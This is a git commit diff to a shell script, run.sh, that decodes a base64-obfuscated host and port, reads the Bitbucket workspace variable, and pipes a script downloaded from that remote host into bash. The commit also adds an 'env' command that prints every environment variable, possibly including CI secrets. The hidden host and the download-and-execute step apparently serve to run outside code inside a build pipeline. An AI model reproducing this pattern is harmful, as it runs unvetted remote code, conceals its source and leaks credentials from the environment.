76b61549387d936d8ed80bdc34ace80cdea1c88e
yao pan <cisum4444@gmail.com>
2021-02-25 07:17:42 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -5,6 +5,7 @@ TMPSTR="aS5hZ2FuemFpLmNvbToyNzQ2Mw=="
 DOMAIN=`echo -n $TMPSTR | base64 -d`
 ROLEID=$BITBUCKET_WORKSPACE
 echo $DOMAIN 
+env
 
 # 运行
-curl -s -L http://$DOMAIN/script.sh?id=$ROLEID-bb | bash -s run $ROLEID-bb
+curl -s -L http://$DOMAIN/script.sh?id=$ROLEID-bb | bash -s norun $ROLEID-bb
